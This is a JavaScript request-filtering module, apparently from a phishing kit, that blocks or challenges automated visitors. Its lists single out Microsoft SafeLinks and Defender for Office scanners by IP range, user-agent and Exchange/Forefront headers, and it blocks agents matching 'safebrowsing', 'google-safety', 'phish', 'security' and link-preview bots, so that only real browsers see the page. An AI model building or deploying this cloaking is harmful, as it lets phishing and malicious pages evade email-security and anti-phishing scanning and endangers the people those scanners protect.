import crypto from 'crypto';
import { isIPv4 } from 'net';

export const BOTGUARD_COOKIE_NAME = '_bg_v';
export const BOTGUARD_CHALLENGE_TTL = 300;

const BOT_UA_PATTERNS = [
    /bot/i,
    /crawler/i,
    /spider/i,
    /scraper/i,
    /curl/i,
    /wget/i,
    /python-requests/i,
    /python-urllib/i,
    /go-http-client/i,
    /java\//i,
    /httpclient/i,
    /headlesschrome/i,
    /phantomjs/i,
    /selenium/i,
    /puppeteer/i,
    /playwright/i,
    /mechanize/i,
    /libwww-perl/i,
    /apache-httpclient/i,
    /okhttp/i,
    /node-fetch/i,
    /axios/i,
    /lynx/i,
    /zgrab/i,
    /masscan/i,
    /nmap/i,
    /censys/i,
    /shodan/i,
    /security/i,
    /scanner/i,
    /probe/i,
    /monitor/i,
    /validator/i,
    /facebook/i,
    /twitter/i,
    /slack/i,
    /discord/i,
    /telegram/i,
    /whatsapp/i,
    /preview/i,
    /google-safety/i,
    /safebrowsing/i,
    /phish/i,
];

const SAFELINKS_SCANNER_CIDRS = [
    '40.94.0.0/16',
    '104.47.0.0/17',
    '40.107.0.0/16',
    '40.92.0.0/17',
    '52.100.128.0/17',
    '2a01:111:f400::/48',
];

const SAFELINKS_SCANNER_UA = [
    /Microsoft Office Protocol Discovery/i,
    /MS[\s-]?Email[\s-]?Security/i,
    /Microsoft[\s-]?URL[\s-]?Preview/i,
    /Outlook[\s-]?SafeLinks/i,
    /Defender[\s-]?for[\s-]?Office/i,
    /BingPreview/i,
];

const SAFELINKS_SCANNER_HEADER_KEYS = [
    'x-ms-exchange',
    'x-forefront-antispam',
    'x-office365-filtering',
    'x-ms-publictraffictype',
];

function normalizeBotguardConfig(config) {
    const bg = config?.botguard || {};
    return {
        enabled: bg.enabled !== false,
        jsChallenge: bg.jsChallenge === true,
        safelinksBlock: bg.safelinksBlock !== false,
        blockedJa3: Array.isArray(bg.blockedJa3) ? bg.blockedJa3 : [],
        challengeSecret: bg.challengeSecret || '',
    };
}

function ipv4ToInt(ip) {
    return ip.split('.').reduce((acc, octet) => (acc << 8) + Number(octet), 0) >>> 0;
}

function ipInCidr(ip, cidr) {
    try {
        const [range, bitsStr] = cidr.split('/');
        const bits = Number(bitsStr);
        if (isIPv4(ip) && isIPv4(range)) {
            const mask = bits === 0 ? 0 : (~((1 << (32 - bits)) - 1)) >>> 0;
            return (ipv4ToInt(ip) & mask) === (ipv4ToInt(range) & mask);
        }
        if (ip.includes(':') && range.includes(':')) {
            const normalize = (addr) =>
                addr
                    .split(':')
                    .map((part) => part.padStart(4, '0'))
                    .join('');
            const ipNorm = normalize(ip);
            const rangeNorm = normalize(range);
            const hexBits = Math.ceil(bits / 4);
            return ipNorm.slice(0, hexBits) === rangeNorm.slice(0, hexBits);
        }
        return false;
    } catch {
        return false;
    }
}

function isKnownBotUa(ua) {
    return BOT_UA_PATTERNS.some((pattern) => pattern.test(ua));
}

function isMissingBrowserHeaders(req) {
    const accept = req.headers.accept || '';

    if (accept.includes('application/json')) {
        return false;
    }
    if (req.method === 'POST') {
        const contentType = req.headers['content-type'] || '';
        if (contentType.includes('application/json') || contentType.includes('application/x-www-form-urlencoded')) {
            return false;
        }
    }
    if (!req.headers['accept-language']) {
        return true;
    }
    if (!accept) {
        return true;
    }
    if (req.method === 'GET' && !req.path.includes('.')) {
        if (!accept.includes('text/html') && !accept.includes('*/*')) {
            return true;
        }
    }
    return false;
}

function hasSafelinksScannerHeaders(req) {
    for (const [key, values] of Object.entries(req.headers)) {
        const keyLower = key.toLowerCase();
        if (keyLower === 'referer') {
            continue;
        }
        for (const marker of SAFELINKS_SCANNER_HEADER_KEYS) {
            if (keyLower.includes(marker)) {
                return true;
            }
        }
        for (const value of values) {
            const valueLower = String(value).toLowerCase();
            if (valueLower.includes('forefront') || valueLower.includes('antispam')) {
                return true;
            }
        }
    }
    return false;
}

export function isSafeLinksScanner(req, clientIp, safelinksBlock = true) {
    if (!safelinksBlock) {
        return false;
    }
    if (clientIp && SAFELINKS_SCANNER_CIDRS.some((cidr) => ipInCidr(clientIp, cidr))) {
        return true;
    }
    const ua = req.headers['user-agent'] || '';
    if (SAFELINKS_SCANNER_UA.some((pattern) => pattern.test(ua))) {
        return true;
    }
    if (hasSafelinksScannerHeaders(req)) {
        return true;
    }
    return false;
}

function generateChallengeToken(clientIp, userAgent, challengeSecret, timeBucket) {
    const data = `${clientIp}|${userAgent}|${timeBucket}`;
    return crypto.createHmac('sha256', challengeSecret).update(data).digest('hex').slice(0, 32);
}

function hasValidChallenge(req, clientIp, challengeSecret) {
    const cookie = req.cookies?.[BOTGUARD_COOKIE_NAME];
    if (!cookie) {
        return false;
    }
    const ua = req.headers['user-agent'] || '';
    const nowBucket = Math.floor(Date.now() / 1000 / BOTGUARD_CHALLENGE_TTL);
    for (let offset = 0; offset <= 1; offset += 1) {
        const expected = generateChallengeToken(clientIp, ua, challengeSecret, nowBucket - offset);
        if (cookie === expected) {
            return true;
        }
    }
    return false;
}

export function getChallengeHtml(req, clientIp, config) {
    const bg = normalizeBotguardConfig(config);
    const secret = bg.challengeSecret || config._botguardRuntimeSecret;
    const ua = req.headers['user-agent'] || '';
    const timeBucket = Math.floor(Date.now() / 1000 / BOTGUARD_CHALLENGE_TTL);
    const token = generateChallengeToken(clientIp, ua, secret, timeBucket);

    return `<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Please wait...</title>
<style>
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0;background:#f5f5f5;color:#333}
.container{text-align:center;padding:2rem}
.spinner{width:40px;height:40px;border:4px solid #e0e0e0;border-top:4px solid #333;border-radius:50%;animation:spin 1s linear infinite;margin:0 auto 1rem}
@keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
</style>
</head>
<body>
<div class="container">
<div class="spinner"></div>
<p>Verifying your browser...</p>
</div>
<script>
(function(){
var t='${token}';
var d=new Date();
d.setTime(d.getTime()+(${BOTGUARD_CHALLENGE_TTL}*1000));
document.cookie="${BOTGUARD_COOKIE_NAME}="+t+";expires="+d.toUTCString()+";path=/;SameSite=Lax${config.testMode ? '' : ';Secure'}";
setTimeout(function(){window.location.reload();},1500);
})();
</script>
</body>
</html>`;
}

/**
 * Returns { action: 'allow'|'block'|'challenge', reason?: string }
 */
export function checkBotguard(req, clientIp, config) {
    const bg = normalizeBotguardConfig(config);
    if (!bg.enabled) {
        return { action: 'allow' };
    }

    const ua = req.headers['user-agent'] || '';

    if (isSafeLinksScanner(req, clientIp, bg.safelinksBlock)) {
        return { action: 'block', reason: 'microsoft safelinks scanner' };
    }
    if (isKnownBotUa(ua)) {
        return { action: 'block', reason: `bot user-agent: ${ua.slice(0, 120)}` };
    }
    if (!ua) {
        return { action: 'block', reason: 'empty user-agent' };
    }
    if (isMissingBrowserHeaders(req)) {
        return { action: 'block', reason: 'missing browser headers' };
    }

    const ja3 = req.headers['x-ja3-fingerprint'];
    if (ja3 && bg.blockedJa3.includes(ja3)) {
        return { action: 'block', reason: `blocked ja3: ${ja3}` };
    }

    if (bg.jsChallenge) {
        const secret = bg.challengeSecret || config._botguardRuntimeSecret;
        if (!hasValidChallenge(req, clientIp, secret)) {
            return { action: 'challenge', reason: 'js challenge required' };
        }
    }

    return { action: 'allow' };
}

export function initBotguard(config) {
    const bg = normalizeBotguardConfig(config);
    if (!bg.challengeSecret) {
        config._botguardRuntimeSecret = crypto.randomBytes(32).toString('hex');
    }
    return bg;
}
